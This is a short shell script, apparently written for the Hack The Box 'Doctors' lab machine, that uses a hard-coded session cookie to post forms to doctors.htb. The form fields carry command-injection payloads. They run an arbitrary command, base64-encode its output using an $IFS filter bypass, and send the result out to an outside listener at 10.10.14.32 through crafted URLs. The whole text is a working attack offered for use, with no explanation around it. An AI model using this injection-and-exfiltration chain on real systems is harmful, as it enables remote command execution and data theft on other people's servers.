#!/bin/sh

AUTH=".eJwlzjtuAzEMRdG9qHZBkaIkejMD_oQEBhJgxq4M7z0CUr77mvMuxzrz-ir35_nKWzm-o9wLMbcclUKpWRvMVjmHo6qgTKY5x0hvSiliih5ZU-q-bCBDVTcFWLFM-2yE0bqvSrXLlHTrTKSqK3HpJOidJMGtdaXqkA5cNuR15fmvwT39Otfx_H3kzw4GQKKrxXRN5zEp2hYMDk1EmOoSUdHL5w_mtkAe.X4VHTg.j3-hUHG7EShBIsc15coZNCPTPU4"

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://10.10.14.32:22473/-\$(${1}>out)-&submit=Post" | grep login

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://10.10.14.32:22473/-\$(base64\$IFS--wrap=0<out>b64)-&submit=Post" | grep login

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://10.10.14.32:22473/b64/\$(cat<b64)&submit=Post" | grep login